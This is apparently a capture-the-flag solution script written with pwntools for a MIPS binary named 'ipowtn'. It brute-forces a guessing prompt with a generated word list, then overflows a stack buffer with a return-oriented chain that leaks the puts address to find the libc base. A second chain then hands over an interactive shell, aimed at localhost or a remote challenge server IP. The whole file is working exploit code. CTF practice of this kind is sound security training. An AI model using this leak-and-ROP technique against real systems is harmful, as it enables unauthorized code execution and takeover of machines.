#coding: utf-8
from pwn import *
import sys

LOCAL = True
context.arch = 'mips'
context.endian = 'big'

sysshell = 0x400A9C
if LOCAL:
    elf = ELF("./ipowtn")
    #io = remote("10.211.55.3", 22333)
    io = remote("127.0.0.1", 22333)
    #context.log_level = True
else:
    io = remote("106.75.64.188", 18067)
    #context.log_level = True

guesslist = ["nomal", "arch", "bcz", "W3Are", "We", "are", "grad", "from"]

for c in range(11, 0x100):
    guesslist.append("hakker"+chr(c)+"h")
for c in range(22, 0x100):
    guesslist.append("hakker"+chr(c)+"d")

#context.log_level = 'debug'
#pause()
flg_success = 0
timesp = 0
def guessn():
    global flg_success
    global timesp
    if timesp > 20000:
        io.close()
        sys.exit(0)
    for gstr in guesslist:
        #print "testing", gstr
        if len(gstr) >= 8:
            #pause()
            io.send(gstr)
        else:
            io.sendline(gstr)
        try:
            data = io.recvline(timeout=0.1)
            timesp += 1
            #data = io.recvline()
            if len(data) > 5 and "guess it!!!!!!" in data:
                continue
            elif len(data) >= 1 and len(data)<=4:
                log.success("guess over!!!!!!!!!!")
                return 1
            else:
                flg_success += 1
                log.success("ok is "+gstr)
                if flg_success >= 9:
                    return 1
                else:
                    return 0
        except:
            return 0
        finally:
            pass

log.info("starting guess")
while True:
    #pause()
    if guessn() == 1:
        break

io.recvuntil("... go!\n")
bss_addr = 0x0411420
# 0x00400788: lw $ra, 0x1c($sp); move $at, $at; jr $ra;
payload = 0x1c*chr(0)
payload += p32(0x411448)    # s0
payload += p32(bss_addr)    # fp
# printf
payload += p32(0x400F74)    # ra
io.sendline(payload)
data = io.recv(4)
puts_addr = u32(data)
log.info("puts address: " + hex(puts_addr))


puts_offset = 0x6DEE0
lk_stack_offset = 0x1873A4
libc = ELF("./libc-2.13.so")
libc.address = puts_addr - puts_offset
log.success("libc address is " + hex(libc.address))

io.recvuntil("... go!\n")

payload = 'a'*0x1c
payload += p32(0x0401320)   # s0
payload += p32(bss_addr)   # fp
# 0x000ef2fc: move $a0, $s0; lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra;
# 0x0006e630: move $a0, $s0; lw $ra, 0x2c($sp); lw $s0, 0x28($sp); jr $ra;
payload += p32(0x000ef2fc+libc.address) # ra
payload += 0x24*chr(0)
payload += p32(0x400840)
io.sendline(payload)
io.interactive()



